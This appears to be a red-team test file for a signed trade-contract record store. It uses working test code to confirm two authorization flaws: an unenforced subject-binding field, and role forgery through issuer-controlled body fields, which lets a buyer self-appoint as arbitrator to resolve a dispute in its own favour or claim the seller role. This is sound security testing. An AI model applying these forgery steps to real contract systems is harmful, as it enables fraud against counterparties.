// RED-TEAM rt01: (1) x-dtp-subject body-binding is never enforced; (2) state-machine roles are
// derived from issuer-controlled body fields with no continuity check, letting a party self-assign
// a role (arbitrator) it does not hold and drive a role-gated transition unilaterally.
//
//   node --test tests/redteam/rt01_subject_and_role_forgery.test.ts
import test from "node:test";
import assert from "node:assert/strict";
import { setup, makeCompany, draft, nowIso, log, type Env } from "./rt-helpers.ts";
import { contractBody } from "../helpers.ts";

let env: Env;
test.before(async () => { env = await setup(); });
test.after(async () => { await env.close(); });

// ---------------------------------------------------------------------------
// FINDING A — x-dtp-subject not enforced: body's subject field may disagree with subject_company_id.
// SPEC §3.5 / §3.1: "x-dtp-subject — the body field that must equal subject_company_id."
// ---------------------------------------------------------------------------
test("A: trade.contract accepted with body.buyer_company_id != subject_company_id (x-dtp-subject unenforced)", async () => {
  const A = await makeCompany(env.base, "wb-attacker");   // the writer
  const B = await makeCompany(env.base, "wb-cabinet");    // whose cabinet the record lands in (subject)
  const C = await makeCompany(env.base, "wb-namedbuyer"); // named as buyer in the body, but NOT the subject

  // subject = B, but body.buyer_company_id = C. x-dtp-subject for trade.contract is buyer_company_id,
  // so the store MUST require body.buyer_company_id == subject_company_id (== B). It does not.
  const unsigned = draft({
    type: "trade.contract",
    subject_company_id: B.id,                 // cabinet
    counterparty_ids: [A.id],                 // A is a party -> passes issuer_not_party
    issuer: { key_id: A.kp.keyId, company_id: A.id, module_id: null },
    visibility: "counterparties",
    body: contractBody(C.id, A.id),           // buyer_company_id = C (mismatch!), seller = A
  });
  const r = await A.client.sign(unsigned, A.kp.secretKey);
  log("A stored record", { subject: r.record.subject_company_id, body_buyer: (r.record.body as any).buyer_company_id, created: r.created });

  assert.equal(r.created, true, "store accepted a contract whose subject != body.buyer_company_id");
  assert.equal(r.record.subject_company_id, B.id);
  assert.notEqual((r.record.body as any).buyer_company_id, r.record.subject_company_id,
    "CONFIRMED: subject_company_id and the x-dtp-subject body field disagree, yet the write was accepted");
});

// ---------------------------------------------------------------------------
// FINDING C — role forgery via issuer-controlled body fields.
// SPEC §3.5: a role-gated transition's `by` must be one of the ISSUER'S roles. rolesOf() grants the
// "arbitrator" role to anyone who writes body.arbitrator_company_id == themselves, with no check that
// this matches the prior head. So the buyer can self-appoint as arbitrator and resolve a dispute in
// its own favor (disputed -> resolved_buyer, by:[arbitrator]) without any real arbitrator.
// ---------------------------------------------------------------------------
test("C: buyer self-assigns the arbitrator role and unilaterally resolves a dispute in its favor", async () => {
  const buyer = await makeCompany(env.base, "wb-buyer");
  const seller = await makeCompany(env.base, "wb-seller");

  const supersede = async (writer: typeof buyer, prev: any, patch: Record<string, unknown>) => {
    const record_id = crypto.randomUUID();
    const unsigned = draft({
      type: "trade.contract",
      record_id,
      root_id: prev.root_id,
      supersedes: prev.record_id,
      subject_company_id: prev.subject_company_id,
      counterparty_ids: prev.counterparty_ids,
      issuer: { key_id: writer.kp.keyId, company_id: writer.id, module_id: null },
      visibility: "counterparties",
      body: { ...prev.body, ...patch },
    });
    return (await writer.client.sign(unsigned, writer.kp.secretKey)).record;
  };

  // genesis: buyer creates an active contract; arbitrator initially a real third party (null here).
  const g = draft({
    type: "trade.contract",
    subject_company_id: buyer.id,
    counterparty_ids: [seller.id],
    issuer: { key_id: buyer.kp.keyId, company_id: buyer.id, module_id: null },
    visibility: "counterparties",
    body: contractBody(buyer.id, seller.id, { arbitrator_company_id: null, status: "active" }),
  });
  let rec = (await buyer.client.sign(g, buyer.kp.secretKey)).record;
  rec = await supersede(seller, rec, { status: "in_fulfillment" });          // seller-only transition
  rec = await supersede(buyer, rec, { status: "disputed" });                 // buyer opens a dispute
  log("C before self-resolve", { status: (rec.body as any).status, arbitrator: (rec.body as any).arbitrator_company_id });

  // EXPLOIT: buyer supersedes disputed->resolved_buyer (by:[arbitrator]) while naming ITSELF arbitrator.
  const resolved = await supersede(buyer, rec, { status: "resolved_buyer", arbitrator_company_id: buyer.id });
  log("C after self-resolve", { status: (resolved.body as any).status, arbitrator: (resolved.body as any).arbitrator_company_id, issuer: resolved.issuer.company_id });

  assert.equal((resolved.body as any).status, "resolved_buyer",
    "CONFIRMED: buyer performed an arbitrator-only transition by self-assigning the arbitrator role");
  assert.equal(resolved.issuer.company_id, buyer.id, "the resolving issuer is the buyer, not a neutral arbitrator");
});

// ---------------------------------------------------------------------------
// FINDING C' — the general case: buyer claims the seller role to drive a seller-only transition.
// ---------------------------------------------------------------------------
test("C': buyer drives the seller-only active->in_fulfillment transition by rewriting seller_company_id", async () => {
  const buyer = await makeCompany(env.base, "wb-b2");
  const seller = await makeCompany(env.base, "wb-s2");

  const g = draft({
    type: "trade.contract",
    subject_company_id: buyer.id,
    counterparty_ids: [seller.id],
    issuer: { key_id: buyer.kp.keyId, company_id: buyer.id, module_id: null },
    visibility: "counterparties",
    body: contractBody(buyer.id, seller.id, { status: "active" }),
  });
  const rec = (await buyer.client.sign(g, buyer.kp.secretKey)).record;

  // buyer supersedes and claims seller role by setting seller_company_id = buyer, advancing to in_fulfillment.
  const record_id = crypto.randomUUID();
  const unsigned = draft({
    type: "trade.contract",
    record_id, root_id: rec.root_id, supersedes: rec.record_id,
    subject_company_id: buyer.id, counterparty_ids: [seller.id],
    issuer: { key_id: buyer.kp.keyId, company_id: buyer.id, module_id: null },
    visibility: "counterparties",
    body: { ...rec.body, seller_company_id: buyer.id, status: "in_fulfillment" },
  });
  const r = await buyer.client.sign(unsigned, buyer.kp.secretKey);
  log("C' result", { status: (r.record.body as any).status, seller: (r.record.body as any).seller_company_id });
  assert.equal((r.record.body as any).status, "in_fulfillment",
    "CONFIRMED: a seller-only transition was performed by the buyer after claiming the seller role");
});
